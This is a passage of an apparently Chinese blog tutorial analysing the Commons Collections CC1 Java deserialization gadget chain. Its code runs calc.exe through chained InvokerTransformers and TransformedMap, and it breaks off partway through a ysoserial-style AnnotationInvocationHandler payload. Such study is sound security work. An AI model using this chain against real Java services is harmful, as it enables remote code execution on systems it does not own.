&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">iMethodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iParamTypes&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iArgs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; does not exist&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; cannot be accessed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; threw an exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>ChainedTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>也是一个实现了Transformer接口的类，作用是将内部多个Transformer串在一起&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前一个回调返回的结果可以作为后一个回调的参数传入&lt;/p>
&lt;h3 id="demo">demo&lt;/h3>
&lt;p>然后再来看demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们创建了一个ChainedTransformer，包含ConstantTransformer（得到Runtime对象）和InvokerTransformer（执行代码部分），这个ChainedTransformer只是作为回调部分，我们用TransformedMap.decorate对它进行包装，最后通过&lt;code>outerMap.put&lt;/code> 向Map中放入新元素触发回调，进而执行命令&lt;/p>
&lt;h3 id="transformedmap">TransformedMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
